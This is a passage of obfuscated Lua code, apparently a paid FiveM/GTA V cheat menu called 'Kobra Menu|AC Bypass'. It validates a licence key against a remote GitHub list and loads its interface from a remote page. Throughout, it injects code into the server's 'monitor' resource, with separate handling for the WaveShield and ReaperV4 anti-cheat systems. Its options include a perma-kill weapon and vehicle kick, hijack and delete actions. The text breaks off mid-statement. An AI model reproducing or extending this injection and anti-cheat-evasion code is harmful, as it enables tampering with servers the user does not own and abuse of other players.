MachoLockLogger(1);local v0="jkiushdiufhsdbofihUYHFUYJASHIUYGAS872765873u4hj5nkjbytFCUSAKIHJJYDSFHTDHSHOIUHdiuaghdfjyhsbdioufjneqwouerhy287y34gujkdsnikufguyhcflbijksdfhugygdisufhgsyhtgdfvsd";local function v1(v119,v120) local v121=1269 -(231 + 1038) ;local v122;while true do if (v121==(1 + 0)) then if DEBUG then local v753={};for v830=1163 -(171 + 991) , #v122 do v753[v830]=string.byte(v122,v830);end print("[KOBRA Safety] Decoded secret: "   .. table.concat(v753,",") );end return v122;end if (v121==(0 -0)) then v122="";for v684=2 -1 , #v119 do local v685=0 -0 ;local v686;while true do if (v685==(0 + 0)) then v686=string.byte(v119,v684);v122=v122   .. string.char((v686-v120)%(897 -641) ) ;break;end end end v121=2 -1 ;end end end local v2="https://raw.githubusercontent.com/WM5M/564756558758547545475566858754hnfvngfjhgvgjfjghfffjfgffjgj/refs/heads/main/wzmkeys.json";local v3=MachoWebRequest(v2);local v4=MachoAuthenticationKey();local v5=true;local function v6() local v123=0 -0 ;local v124;while true do if (v123==(0 -0)) then v124=GetCloudTimeAsInt();return ((v124>0) and v124) or (1248 -(111 + 1137)) ;end end end local function v7(v125) if (type(v125)~="string") then return nil;end local v126,v127,v128,v129,v130,v131=string.match(v125,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");if  not v126 then return nil;end local v132=((tonumber(v126) -(2128 -(91 + 67))) * (1086 -721)) + math.floor((tonumber(v126) -(492 + 1477))/4 ) + ((tonumber(v127) -(524 -(423 + 100))) * (1 + 29)) + tonumber(v128) ;return (v132 * (239229 -152829)) + (tonumber(v129) * (1877 + 1723)) + (tonumber(v130) * (831 -(326 + 445))) + tonumber(v131) ;end local function v8() if  not v3 then return false,"No key list available";end local v133,v134=pcall(json.decode,v3);if ( not v133 or  not v134 or (type(v134)~="table")) then return false,"Key list invalid";end local v135=v6();for v313,v314 in ipairs(v134) do if ((type(v314)=="table") and (v314.key==v4)) then if (v314.expires and (type(v314.expires)=="string")) then local v754=v7(v314.expires);if  not v754 then return false,"Bad expiry format";end if (v754>v135) then return true,"Key valid (not expired)",v754;else return false,"Key expired",v754;end elseif v5 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end local v9,v10,v11=v8();if  not v9 then MachoMenuNotification("KOBRA","Your key ain't valid lmfao: "   .. v4   .. " ("   .. v10   .. ")" ,43 -33 );return;end Citizen.CreateThread(function() if (v11 and (v11>(0 -0))) then local v518=v6();local v519=v11-v518 ;if (v519>0) then local v687=math.floor(v519/(201677 -115277) );local v688=math.floor((v519%86400)/3600 );local v689=string.format("Your key is valid. Expires in %d days and %d hours.",v687,v688);MachoMenuNotification("KOBRA",v689,5);else MachoMenuNotification("KOBRA","Key expired.",10);end else MachoMenuNotification("KOBRA","Key valid (no expiry field).",716 -(530 + 181) );end end);local v12={};local v13=false;local v14=nil;local v15=1;local v16={};local v17=v16;local v18=nil;local v19=882 -(614 + 267) ;local v20={};local v21={};local v22=nil;local v23="H";local v24=false;local v25={};local v26=false;local v27={};local v28={[GetHashKey("weapon_unarmed")]="Fists",[GetHashKey("weapon_knife")]="Knife",[GetHashKey("weapon_nightstick")]="Nightstick",[GetHashKey("weapon_hammer")]="Hammer",[GetHashKey("weapon_bat")]="Baseball Bat",[GetHashKey("weapon_golfclub")]="Golf Club",[GetHashKey("weapon_crowbar")]="Crowbar",[GetHashKey("weapon_pistol")]="Pistol",[GetHashKey("weapon_pistol_mk2")]="Pistol Mk II",[GetHashKey("weapon_snspistol_mk2")]="SNS Pistol Mk II",[GetHashKey("weapon_ceramicpistol")]="Ceramic Pistol",[GetHashKey("weapon_revolver_mk2")]="Heavy Revolver Mk II",[GetHashKey("weapon_doubleaction")]="Double-Action Revolver",[GetHashKey("weapon_gadgetpistol")]="Gadget Pistol",[GetHashKey("weapon_pistolxm3")]="WM 29 Pistol",[GetHashKey("weapon_combatpistol")]="Combat Pistol",[GetHashKey("weapon_appistol")]="AP Pistol",[GetHashKey("weapon_pistol50")]="Pistol .50",[GetHashKey("weapon_microsmg")]="Micro SMG",[GetHashKey("weapon_smg")]="SMG",[GetHashKey("weapon_assaultsmg")]="Assault SMG",[GetHashKey("weapon_assaultrifle")]="Assault Rifle",[GetHashKey("weapon_assaultrifle_mk2")]="Assault Rifle Mk II",[GetHashKey("weapon_specialcarbine_mk2")]="Special Carbine Mk II",[GetHashKey("weapon_bullpuprifle_mk2")]="Bullpup Rifle Mk II",[GetHashKey("weapon_militaryrifle")]="Military Rifle",[GetHashKey("weapon_tacticalrifle")]="Service Carbine",[GetHashKey("weapon_battlerifle")]="Battle Rifle",[GetHashKey("weapon_carbinerifle")]="Carbine Rifle",[GetHashKey("weapon_advancedrifle")]="Advanced Rifle",[GetHashKey("weapon_mg")]="MG",[GetHashKey("weapon_combatmg")]="Combat MG",[GetHashKey("weapon_pumpshotgun")]="Pump Shotgun",[GetHashKey("weapon_sawnoffshotgun")]="Sawed-Off Shotgun",[GetHashKey("weapon_assaultshotgun")]="Assault Shotgun",[GetHashKey("weapon_bullpupshotgun")]="Bullpup Shotgun",[GetHashKey("weapon_hackingdevice")]="Hacking Device",[GetHashKey("weapon_stungun")]="Stun Gun",[GetHashKey("weapon_stungun_mp")]="Stun Gun MP",[GetHashKey("weapon_sniperrifle")]="Sniper Rifle",[GetHashKey("weapon_heavysniper")]="Heavy Sniper",[GetHashKey("weapon_grenadelauncher")]="Grenade Launcher",[GetHashKey("weapon_rpg")]="RPG",[GetHashKey("weapon_minigun")]="Minigun",[GetHashKey("weapon_grenade")]="Grenade",[GetHashKey("weapon_stickybomb")]="Sticky Bomb",[GetHashKey("weapon_smokegrenade")]="Smoke Grenade",[GetHashKey("weapon_bzgas")]="BZ Gas",[GetHashKey("weapon_molotov")]="Molotov Cocktail",[GetHashKey("weapon_fireextinguisher")]="Fire Extinguisher",[GetHashKey("weapon_petrolcan")]="Jerry Can",[GetHashKey("weapon_ball")]="Baseball",[GetHashKey("weapon_snspistol")]="SNS Pistol",[GetHashKey("weapon_bottle")]="Broken Bottle",[GetHashKey("weapon_gusenberg")]="Gusenberg Sweeper",[GetHashKey("weapon_specialcarbine")]="Special Carbine",[GetHashKey("weapon_heavypistol")]="Heavy Pistol",[GetHashKey("weapon_bullpuprifle")]="Bullpup Rifle",[GetHashKey("weapon_dagger")]="Dagger",[GetHashKey("weapon_vintagepistol")]="Vintage Pistol",[GetHashKey("weapon_firework")]="Firework Launcher",[GetHashKey("weapon_musket")]="Musket",[GetHashKey("weapon_heavyshotgun")]="Heavy Shotgun",[GetHashKey("weapon_marksmanrifle")]="Marksman Rifle",[GetHashKey("weapon_hominglauncher")]="Homing Launcher",[GetHashKey("weapon_proxmine")]="Proximity Mines",[GetHashKey("weapon_snowball")]="Snowball",[GetHashKey("weapon_flaregun")]="Flare Gun",[GetHashKey("weapon_garbagebag")]="Garbage Bag",[GetHashKey("weapon_handcuffs")]="Handcuffs",[GetHashKey("weapon_combatpdw")]="Combat PDW",[GetHashKey("weapon_marksmanpistol")]="Marksman Pistol",[GetHashKey("weapon_knuckle")]="Knuckle Dusters",[GetHashKey("weapon_hatchet")]="Hatchet",[GetHashKey("weapon_railgun")]="Railgun",[GetHashKey("weapon_machinepistol")]="Machine Pistol",[GetHashKey("weapon_switchblade")]="Switchblade",[GetHashKey("weapon_revolver")]="Heavy Revolver",[GetHashKey("weapon_heavyrifle")]="Heavy Rifle",[GetHashKey("weapon_dbshotgun")]="Double Barrel Shotgun",[GetHashKey("weapon_compactrifle")]="Compact Rifle",[GetHashKey("weapon_battleaxe")]="Battle Axe",[GetHashKey("weapon_compactlauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_minismg")]="Mini SMG",[GetHashKey("weapon_pipebomb")]="Pipe Bomb",[GetHashKey("weapon_poolcue")]="Pool Cue",[GetHashKey("weapon_wrench")]="Wrench",[GetHashKey("weapon_autoshotgun")]="Sweeper Shotgun",[GetHashKey("weapon_bread")]="Piece of Bread",[GetHashKey("weapon_stone_hatchet")]="Stone Hatchet",[GetHashKey("weapon_rayminigun")]="Unholy Hellbringer",[GetHashKey("weapon_raycarbine")]="Widowmaker",[GetHashKey("weapon_compactgrenadelauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_smugglerpistol")]="Up-n-Atomizer",[GetHashKey("weapon_raypistol")]="Up-n-Atomizer",[GetHashKey("weapon_perico_pistol")]="Ceramic Pistol",[GetHashKey("weapon_carbinerifle_mk2")]="Carbine Rifle Mk II",[GetHashKey("weapon_combatmg_mk2")]="Combat MG Mk II",[GetHashKey("weapon_heavysniper_mk2")]="Heavy Sniper Mk II",[GetHashKey("weapon_marksmanrifle_mk2")]="Marksman Rifle Mk II",[GetHashKey("weapon_pumpshotgun_mk2")]="Pump Shotgun Mk II",[GetHashKey("weapon_smg_mk2")]="SMG Mk II",[GetHashKey("weapon_raycarbine_mk2")]="Widowmaker Mk II",[GetHashKey("weapon_machete")]="Machete",[GetHashKey("weapon_flashlight")]="Flashlight",[GetHashKey("weapon_hazardousknife")]="Hazardous Knife",[GetHashKey("weapon_navyrevolver")]="Navy Revolver",[GetHashKey("weapon_golfball")]="Golf Ball"};local v29=false;local v30=false;local v31=false;local v32=false;local v33=nil;local v34=33 -(19 + 13) ;local v35=1 -0 ;local v36={"WEAPON_APPISTOL","WEAPON_PISTOL","WEAPON_SMG","WEAPON_ASSAULTRIFLE","WEAPON_RPG","WEAPON_PERMKILL","WEAPON_AIRSTRIKE_ROCKET"};local v37={"Adder","Zentorno","Comet","Banshee","Trash","Dump"};local v38={"Default","Teleport","Shoot Weapon","Kick from Vehicle","Hijack Vehicle","Delete Vehicle"};local v39=1 + 0 ;local v40=false;local v41=false;local v42=false;local v43=false;local v44=false;local v45={[62 -35 ]="Escape",[112]="F1",[27 + 86 ]="F2",[38 + 76 ]="F3",[72 + 43 ]="F4",[1212 -(709 + 387) ]="F5",[1975 -(673 + 1185) ]="F6",[118]="F7",[344 -225 ]="F8",[385 -265 ]="F9",[198 -77 ]="F10",[88 + 34 ]="F11",[92 + 31 ]="F12",[258 -66 ]="`",[49]="1",[13 + 37 ]="2",[101 -50 ]="3",[101 -49 ]="4",[1933 -(446 + 1434) ]="5",[54]="6",[55]="7",[56]="8",[57]="9",[48]="0",[1472 -(1040 + 243) ]="-",[558 -371 ]="=",[1855 -(559 + 1288) ]="Backspace",[1940 -(609 + 1322) ]="Tab",[535 -(13 + 441) ]="Q",[325 -238 ]="W",[69]="E",[214 -132 ]="R",[418 -334 ]="T",[4 + 85 ]="Y",[308 -223 ]="U",[73]="I",[29 + 50 ]="O",[36 + 44 ]="P",[649 -430 ]="[",[121 + 100 ]="]",[404 -184 ]="\\",[14 + 6 ]="CapsLock",[37 + 28 ]="A",[60 + 23 ]="S",[58 + 10 ]="D",[69 + 1 ]="F",[504 -(153 + 280) ]="G",[207 -135 ]="H",[67 + 7 ]="J",[75]="K",[31 + 45 ]="L",[186]=";",[117 + 105 ]="'",[12 + 1 ]="Enter",[16]="Shift",[66 + 24 ]="Z",[133 -45 ]="X",[42 + 25 ]="C",[86]="V",[733 -(89 + 578) ]="B",[78]="N",[56 + 21 ]="M",[390 -202 ]=",",[1239 -(572 + 477) ]=".",[191]="/",[3 + 14 ]="Control",[46]="Delete",[20 + 13 ]="PageUp",[34]="PageDown",[5 + 30 ]="End",[122 -(84 + 2) ]="Home",[62 -24 ]="ArrowUp",[29 + 11 ]="ArrowDown",[879 -(497 + 345) ]="ArrowLeft",[1 + 38 ]="ArrowRight"};local v46={[27]=55 + 267 ,[1445 -(605 + 728) ]=206 + 82 ,[251 -138 ]=289,[114]=8 + 162 ,[115]=617 -450 ,[116]=150 + 16 ,[324 -207 ]=167,[90 + 28 ]=168,[119]=658 -(457 + 32) ,[51 + 69 ]=1458 -(832 + 570) ,[121]=54 + 3 ,[122]=344,[33 + 90 ]=1220 -875 ,[93 + 99 ]=1039 -(588 + 208) ,[49]=422 -265 ,[1850 -(884 + 916) ]=158,[106 -55 ]=160,[52]=96 + 68 ,[706 -(232 + 421) ]=2054 -(1569 + 320) ,[54]=40 + 119 ,[11 + 44 ]=542 -381 ,[661 -(316 + 289) ]=423 -261 ,[3 + 54 ]=163,[1501 -(666 + 787) ]=507 -(360 + 65) ,[177 + 12 ]=338 -(79 + 175) ,[294 -107 ]=83,[7 + 1 ]=542 -365 ,[16 -7 ]=936 -(503 + 396) ,[81]=44,[268 -(92 + 89) ]=61 -29 ,[36 + 33 ]=46,[49 + 33 ]=176 -131 ,[12 + 72 ]=245,[202 -113 ]=215 + 31 ,[41 + 44 ]=922 -619 ,[10 + 63 ]=74,[119 -40 ]=199,[80]=7,[1463 -(485 + 759) ]=89 -50 ,[1410 -(442 + 747) ]=40,[1355 -(832 + 303) ]=36,[966 -(88 + 858) ]=137,[20 + 45 ]=34,[69 + 14 ]=33,[3 + 65 ]=819 -(766 + 23) ,[345 -275 ]=66 -17 ,[186 -115 ]=159 -112 ,[1145 -(1036 + 37) ]=53 + 21 ,[143 -69 ]=245 + 66 ,[1555 -(641 + 839) ]=1224 -(910 + 3) ,[193 -117 ]=7,[186]=1765 -(1466 + 218) ,[103 + 119 ]=1230 -(556 + 592) ,[13]=7 + 11 ,[824 -(329 + 479) ]=875 -(174 + 680) ,[309 -219 ]=41 -21 ,[63 + 25 ]=812 -(396 + 343) ,[6 + 61 ]=1503 -(29 + 1448) ,[1475 -(135 + 1254) ]=0 -0 ,[66]=135 -106 ,[78]=166 + 83 ,[77]=1771 -(389 + 1138) ,[188]=82,[190]=81,[765 -(102 + 472) ]=79 + 4 ,[10 + 7 ]=36,[43 + 3 ]=178,[1578 -(320 + 1225) ]=17 -7 ,[34]=7 + 4 ,[1499 -(157 + 1307) ]=2072 -(821 + 1038) ,[89 -53 ]=213,[38]=3 + 24 ,[71 -31 ]=65 + 108 ,[37]=431 -257 ,[1065 -(834 + 192) ]=175};local v47={weapon_unarmed={label="Unarmed",hash=GetHashKey("weapon_unarmed")},weapon_knife={label="Knife",hash=GetHashKey("weapon_knife")},weapon_dagger={label="Dagger",hash=GetHashKey("weapon_dagger")},weapon_bat={label="Baseball Bat",hash=GetHashKey("weapon_bat")},weapon_bottle={label="Broken Bottle",hash=GetHashKey("weapon_bottle")},weapon_crowbar={label="Crowbar",hash=GetHashKey("weapon_crowbar")},weapon_golfclub={label="Golf Club",hash=GetHashKey("weapon_golfclub")},weapon_hammer={label="Hammer",hash=GetHashKey("weapon_hammer")},weapon_hatchet={label="Hatchet",hash=GetHashKey("weapon_hatchet")},weapon_machete={label="Machete",hash=GetHashKey("weapon_machete")},weapon_switchblade={label="Switchblade",hash=GetHashKey("weapon_switchblade")},weapon_nightstick={label="Nightstick",hash=GetHashKey("weapon_nightstick")},weapon_wrench={label="Wrench",hash=GetHashKey("weapon_wrench")},weapon_pistol={label="Pistol",hash=GetHashKey("weapon_pistol")},weapon_pistol_mk2={label="Pistol Mk II",hash=GetHashKey("weapon_pistol_mk2")},weapon_combatpistol={label="Combat Pistol",hash=GetHashKey("weapon_combatpistol")},weapon_appistol={label="AP Pistol",hash=GetHashKey("weapon_appistol")},weapon_stungun={label="Taser",hash=GetHashKey("weapon_stungun")},weapon_pistol50={label="Pistol .50",hash=GetHashKey("weapon_pistol50")},weapon_snspistol={label="SNS Pistol",hash=GetHashKey("weapon_snspistol")},weapon_heavypistol={label="Heavy Pistol",hash=GetHashKey("weapon_heavypistol")},weapon_vintagepistol={label="Vintage Pistol",hash=GetHashKey("weapon_vintagepistol")},weapon_flaregun={label="Flare Gun",hash=GetHashKey("weapon_flaregun")},weapon_microsmg={label="Micro SMG",hash=GetHashKey("weapon_microsmg")},weapon_smg={label="SMG",hash=GetHashKey("weapon_smg")},weapon_smg_mk2={label="SMG Mk II",hash=GetHashKey("weapon_smg_mk2")},weapon_assaultsmg={label="Assault SMG",hash=GetHashKey("weapon_assaultsmg")},weapon_machinepistol={label="Machine Pistol",hash=GetHashKey("weapon_machinepistol")},weapon_minismg={label="Mini SMG",hash=GetHashKey("weapon_minismg")},weapon_combatpdw={label="Combat PDW",hash=GetHashKey("weapon_combatpdw")},weapon_assaultrifle={label="Assault Rifle",hash=GetHashKey("weapon_assaultrifle")},weapon_assaultrifle_mk2={label="Assault Rifle Mk II",hash=GetHashKey("weapon_assaultrifle_mk2")},weapon_carbinerifle={label="Carbine Rifle",hash=GetHashKey("weapon_carbinerifle")},weapon_carbinerifle_mk2={label="Carbine Rifle Mk II",hash=GetHashKey("weapon_carbinerifle_mk2")},weapon_advancedrifle={label="Advanced Rifle",hash=GetHashKey("weapon_advancedrifle")},weapon_specialcarbine={label="Special Carbine",hash=GetHashKey("weapon_specialcarbine")},weapon_bullpuprifle={label="Bullpup Rifle",hash=GetHashKey("weapon_bullpuprifle")},weapon_bullpuprifle_mk2={label="Bullpup Rifle Mk II",hash=GetHashKey("weapon_bullpuprifle_mk2")},weapon_compactrifle={label="Compact Rifle",hash=GetHashKey("weapon_compactrifle")},weapon_marksmanrifle={label="Marksman Rifle",hash=GetHashKey("weapon_marksmanrifle")},weapon_pumpshotgun={label="Pump Shotgun",hash=GetHashKey("weapon_pumpshotgun")},weapon_pumpshotgun_mk2={label="Pump Shotgun Mk II",hash=GetHashKey("weapon_pumpshotgun_mk2")},weapon_sawnoffshotgun={label="Sawed-Off Shotgun",hash=GetHashKey("weapon_sawnoffshotgun")},weapon_assaultshotgun={label="Assault Shotgun",hash=GetHashKey("weapon_assaultshotgun")},weapon_bullpupshotgun={label="Bullpup Shotgun",hash=GetHashKey("weapon_bullpupshotgun")},weapon_heavyshotgun={label="Heavy Shotgun",hash=GetHashKey("weapon_heavyshotgun")},weapon_autoshotgun={label="Auto Shotgun",hash=GetHashKey("weapon_autoshotgun")},weapon_sniperrifle={label="Sniper Rifle",hash=GetHashKey("weapon_sniperrifle")},weapon_heavysniper={label="Heavy Sniper",hash=GetHashKey("weapon_heavysniper")},weapon_heavysniper_mk2={label="Heavy Sniper Mk II",hash=GetHashKey("weapon_heavysniper_mk2")},weapon_marksmanrifle_mk2={label="Marksman Rifle Mk II",hash=GetHashKey("weapon_marksmanrifle_mk2")},weapon_grenade={label="Grenade",hash=GetHashKey("weapon_grenade")},weapon_stickybomb={label="Sticky Bomb",hash=GetHashKey("weapon_stickybomb")},weapon_molotov={label="Molotov Cocktail",hash=GetHashKey("weapon_molotov")},weapon_pipebomb={label="Pipe Bomb",hash=GetHashKey("weapon_pipebomb")},weapon_proxmine={label="Proximity Mine",hash=GetHashKey("weapon_proxmine")},weapon_rpg={label="RPG",hash=GetHashKey("weapon_rpg")},weapon_grenadelauncher={label="Grenade Launcher",hash=GetHashKey("weapon_grenadelauncher")},weapon_hominglauncher={label="Homing Launcher",hash=GetHashKey("weapon_hominglauncher")},weapon_minigun={label="Minigun",hash=GetHashKey("weapon_minigun")},weapon_railgun={label="Railgun",hash=GetHashKey("weapon_railgun")},weapon_ball={label="Baseball",hash=GetHashKey("weapon_ball")},weapon_smokegrenade={label="Smoke Grenade",hash=GetHashKey("weapon_smokegrenade")},weapon_flare={label="Flare",hash=GetHashKey("weapon_flare")},weapon_petrolcan={label="Jerry Can",hash=GetHashKey("weapon_petrolcan")},weapon_bzgas={label="BZ Gas",hash=GetHashKey("weapon_bzgas")}};local v48=((GetResourceState("WaveShield")=="started") and "Raw") or "Default" ;local v49=((v48=="Raw") and MachoInjectResourceRaw) or MachoInjectResource ;local function v50(v136) MachoInjectResource("any",v136);end v12.Debug=function(v137,v138,v139) local v140={red="^1",yellow="^3",green="^2",info="^5"};local v141=v140[v138] or "^5" ;print(("^7[^5Kobra^7]: [%sDEBUG^7] >> %s"):format(v141,v139));end;v12.SendMessage=function(v142,v143) if (v14 and v143) then MachoSendDuiMessage(v14,json.encode(v143));end end;v12.Notify=function(v144,v145,v146,v147,v148) v144:SendMessage({action="showNotification",type=v145,title=v146,desc=v147,duration=v148});end;v12.GetMenuPath=function(v149) local v150=0 + 0 ;local v151;while true do if (v150==(1 + 0)) then return v151;end if (v150==(0 + 0)) then v151={"By JayMods"};for v690=1 -0 , #v21 do table.insert(v151,v21[v690]);end v150=305 -(300 + 4) ;end end end;v12.UpdateElements=function(v152,v153) local v154=0;local v155;while true do if (v154==(1 + 0)) then if (v18 and (type(v18)=="table") and ( #v18>(0 -0))) then local v755=0;while true do if ((362 -(112 + 250))==v755) then v155.categories=v18;v155.categoryIndex=(v19 or (1 + 0)) -(2 -1) ;break;end end end v152:SendMessage(v155);break;end if (v154==(0 + 0)) then if ( not v153 or (type(v153)~="table")) then return;end v155={action="updateElements",elements=v153,index=v15-(1 + 0) ,path=v152:GetMenuPath()};v154=1;end end end;v12.Initialize=function(v156) v156:Debug("yellow","Kobra loading... Creating DUI and prompting keybind.");local v157="https://rawcdn.githack.com/WM5M/sdkhbvfsdhjkvbdbcfjgasvdhjve64654656843242hjg4g43kg4aguk534/refs/heads/main/401.html";v14=MachoCreateDui(v157);if  not v14 then local v520=0;while true do if (0==v520) then v156:Debug("red","Failed to create DUI!");return;end end end MachoShowDui(v14);Wait(1500);MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title="Choose Menu Key",value=""}));SetNuiFocus(true,true);end;v12.HideUI=function(v158,v159) if v159 then v22={currentMenu=v17,hoveredIndex=v15,menuStack=v20,menuLabelStack=v21,currentCategories=v18,currentCategoryIndex=v19};else v22=nil;end v13=false;v12:SendMessage({action="showUI",visible=false});end;v12.SendMessage=function(v160,v161) local v162=0;while true do if (v162==(0 + 0)) then if ( not v14 or  not v161 or (type(v161)~="table")) then return;end MachoSendDuiMessage(v14,json.encode(v161));break;end end end;v12.ShowUI=function(v163) local v164=0 + 0 ;local v165;while true do if (v164==(1 + 0)) then if (v18 and ( #v18>0)) then local v756=1414 -(1001 + 413) ;while true do if (v756==(0 -0)) then v165.categories=v18;v165.categoryIndex=v19-1 ;break;end end end v163:SendMessage(v165);break;end if (0==v164) then v13=true;v165={action="showUI",visible=true,elements=v17,index=v15-1 ,path=v163:GetMenuPath(),username=Username or "Kobra Menu|AC Bypass" ,header="",theme="kobra-red-black"};v164=883 -(244 + 638) ;end end end;v12.UpdateElements=function(v166,v167) if ( not v167 or (type(v167)~="table")) then return;end local v168={action="updateElements",elements=v167,index=v15-1 ,path=v166:GetMenuPath(),header=""};if (v18 and ( #v18>(693 -(627 + 66)))) then local v521=0;while true do if ((0 -0)==v521) then v168.categories=v18;v168.categoryIndex=(v19 or (603 -(512 + 90))) -1 ;break;end end end v166:SendMessage(v168);end;v26=false;MachoOnKeyDown(function(v169) if ((v169==(1922 -(1665 + 241))) or (v169==(877 -(373 + 344))) or (v169==161)) then v26=true;end if  not v13 then return;end if (v169==(18 + 20)) then v12:SendMessage({action="keydown",key="ArrowUp"});return;end if (v169==(11 + 29)) then local v522=0 -0 ;while true do if ((0 -0)==v522) then v12:SendMessage({action="keydown",key="ArrowDown"});return;end end end if (v169==13) then v12:SendMessage({action="keydown",key="Enter"});return;end end);MachoOnKeyUp(function(v170) if ((v170==(1115 -(35 + 1064))) or (v170==(117 + 43)) or (v170==(344 -183))) then v26=false;end end);local v59=nil;local function v60(v171,v172,v173,v174) local v175=0 + 0 ;while true do if (v175==1) then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v171,value=v59.buffer}));if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);end v175=1238 -(298 + 938) ;end if (v175==(1259 -(233 + 1026))) then if v59 then return;end v59={title=v171,buffer=v172 or "" ,maxLength=1698 -(636 + 1030) ,onConfirm=v173,type=v174 or "typeable" ,closeable=((v174=="keybind") and false) or true ,active=true};v175=1 + 0 ;end if (v175==(3 + 0)) then v24=false;break;end if (v175==(1 + 1)) then Wait(17 + 233 );v12:HideUI(true);v175=224 -(55 + 166) ;end end end MachoOnKeyDown(function(v176) if ( not v59 or  not v59.active) then return;end if (v176==13) then local v523=0 + 0 ;while true do if (v523==0) then v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v523=1;end if (v523==(1 + 1)) then v59=nil;v24=true;v523=11 -8 ;end if (v523==(298 -(36 + 261))) then if v59.onConfirm then v59.onConfirm(v59.buffer);end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);end v523=3 -1 ;end if (v523==(1371 -(34 + 1334))) then return;end end elseif (v176==8) then if (v59.type=="typeable") then v59.buffer=v59.buffer:sub(1 + 0 , -2);else v59.buffer="";end elseif (v176==(21 + 6)) then local v834=0;while true do if ((1286 -(1035 + 248))==v834) then return;end if (v834==0) then if  not v59.closeable then return;end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);end v834=22 -(20 + 1) ;end if ((1 + 0)==v834) then v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v834=2;end if (v834==(321 -(134 + 185))) then v59=nil;v24=true;v834=1136 -(549 + 584) ;end end elseif (v59.type=="keybind") then local v984=685 -(314 + 371) ;local v985;while true do if (v984==0) then v985=v45[v176];if v985 then if (v59.buffer~=v985) then v59.buffer=v985;end end break;end end elseif (v59.type=="typeable") then local v1130={[164 -116 ]="0",[1017 -(478 + 490) ]="1",[27 + 23 ]="2",[1223 -(786 + 386) ]="3",[168 -116 ]="4",[53]="5",[1433 -(1055 + 324) ]="6",[1395 -(1093 + 247) ]="7",[50 + 6 ]="8",[6 + 51 ]="9",[65]="A",[262 -196 ]="B",[227 -160 ]="C",[68]="D",[69]="E",[199 -129 ]="F",[71]="G",[180 -108 ]="H",[73]="I",[27 + 47 ]="J",[288 -213 ]="K",[261 -185 ]="L",[59 + 18 ]="M",[199 -121 ]="N",[767 -(364 + 324) ]="O",[219 -139 ]="P",[194 -113 ]="Q",[28 + 54 ]="R",[83]="S",[351 -267 ]="T",[136 -51 ]="U",[86]="V",[264 -177 ]="W",[1356 -(1249 + 19) ]="X",[81 + 8 ]="Y",[90]="Z",[735 -546 ]="-",[1273 -(686 + 400) ]="=",[148 + 40 ]=",",[419 -(73 + 156) ]=".",[186]=";",[2 + 220 ]="'",[191]="/",[1003 -(721 + 90) ]="`",[1 + 31 ]=" "};local v1131=v1130[v176];if (v1131 and ( #v59.buffer<v59.maxLength)) then local v1202=0 -0 ;while true do if (v1202==(470 -(224 + 246))) then if v12:IsShiftHeld() then if v1131:match("%a") then v1131=v1131:upper();elseif (v1131=="-") then v1131="_";end elseif v1131:match("%a") then v1131=v1131:lower();end v59.buffer=v59.buffer   .. v1131 ;break;end end end end if v59 then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v59.title,value=v59.buffer}));end end);CreateThread(function() while true do local v315=0 -0 ;while true do if ((0 -0)==v315) then Wait(0 + 0 );if (v59~=nil) then local v835=0;while true do if (v835==1) then for v1132=0 + 0 ,263 + 94  do if ((v1132<(95 -47)) or (v1132>(299 -209))) then DisableControlAction(0,v1132,true);end end break;end if (v835==0) then if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);end SetPauseMenuActive(false);v835=514 -(203 + 310) ;end end else Wait(2493 -(1238 + 755) );end break;end end end end);v12.ScrollOne=function(v177,v178) local v179=0 + 0 ;local v180;while true do if ((1534 -(709 + 825))==v179) then if ( not v178 or ( #v17==0)) then return;end v180=0;v179=1 -0 ;end if ((1 -0)==v179) then repeat if (v178=="Up") then v15=v15-(865 -(196 + 668)) ;if (v15<(3 -2)) then v15= #v17;end elseif (v178=="Down") then v15=v15 + (1 -0) ;if (v15> #v17) then v15=1;end end v180=v180 + (834 -(171 + 662)) ;if (v180>(293 -(4 + 89))) then break;end until v17[v15] and (v17[v15].type~="divider")  if v14 then v177:SendMessage({action="keydown",index=v15-(3 -2) });end break;end end end;v12.ScrollTwo=function(v181,v182) local v183=v17[v15];if  not v183 then return;end if (((v183.type=="scrollable") or (v183.type=="scrollable-checkbox")) and v183.values and ( #v183.values>(0 + 0))) then local v524=0 -0 ;while true do if (0==v524) then v183.value=v183.value or 1 ;if (v182=="Left") then local v873=0;while true do if (v873==(0 + 0)) then v183.value=v183.value-(1487 -(35 + 1451)) ;if (v183.value<1) then v183.value= #v183.values;end break;end end elseif (v182=="Right") then v183.value=v183.value + 1 ;if (v183.value> #v183.values) then v183.value=1454 -(28 + 1425) ;end end v524=1994 -(941 + 1052) ;end if (v524==(1 + 0)) then v181:UpdateElements(v17);if ((v183.scrollType=="onScroll") and v183.onSelect) then if (v183.type=="scrollable-checkbox") then v183.onSelect(v183.values[v183.value],v183.checked or false );else v183.onSelect(v183.values[v183.value]);end end break;end end elseif ((v183.type=="slider") or (v183.type=="slider-checkbox")) then v183.value=v183.value or 